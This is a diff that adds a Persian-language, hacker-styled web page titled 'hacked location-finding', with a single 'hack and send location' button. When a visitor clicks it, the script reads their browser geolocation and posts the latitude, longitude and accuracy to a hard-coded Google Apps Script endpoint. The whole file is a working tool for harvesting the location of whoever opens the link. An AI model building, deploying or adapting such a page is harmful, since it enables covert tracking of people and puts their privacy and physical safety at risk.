@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8" />
+  <title>مکان‌یابی هک شده</title>
+  <style>
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+      direction: rtl;
+      background: #000;
+      color: #0f0;
+      user-select: none;
+    }
+    .background-image {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: url('https://i.imgur.com/X4jo2yP.jpg') no-repeat center center/cover;
+      filter: brightness(0.3);
+      z-index: 1;
+    }
+    .container {
+      position: relative;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 2;
+    }
+    #locateBtn {
+      background: transparent;
+      border: 3px solid #0f0;
+      color: #0f0;
+      font-size: 22px;
+      padding: 15px 40px;
+      cursor: pointer;
+      border-radius: 10px;
+      font-weight: bold;
+      transition: background-color 0.3s ease;
+      user-select: none;
+    }
+    #locateBtn:hover {
+      background-color: #0f0;
+      color: #000;
+    }
+  </style>
+</head>
+<body>
+  <div class="background-image"></div>
+  <div class="container">
+    <button id="locateBtn">هک و ارسال مکان</button>
+  </div>
+
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxCQ3AIMDctelAO6N1faYA_52M6NpZyzO8tQgMYi-Jprl1l4QddnLT0mgVQ-HjmetIR/exec';
+
+    document.getElementById('locateBtn').addEventListener('click', () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          fetch(scriptURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              lat: position.coords.latitude,
+              lng: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            })
+          })
+          .then(response => {
+            if(response.ok) {
+              alert('مکان ارسال شد!');
+            } else {
+              alert('ارسال مکان موفق نبود!');
+            }
+          })
+          .catch(() => alert('خطا در ارسال مکان'));
+        }, () => alert('لطفا اجازه دسترسی به مکان را بدهید!'));
+      } else {
+        alert('دستگاه شما از مکان‌یابی پشتیبانی نمی‌کند');
+      }
+    });
+  </script>
+</body>
+</html>
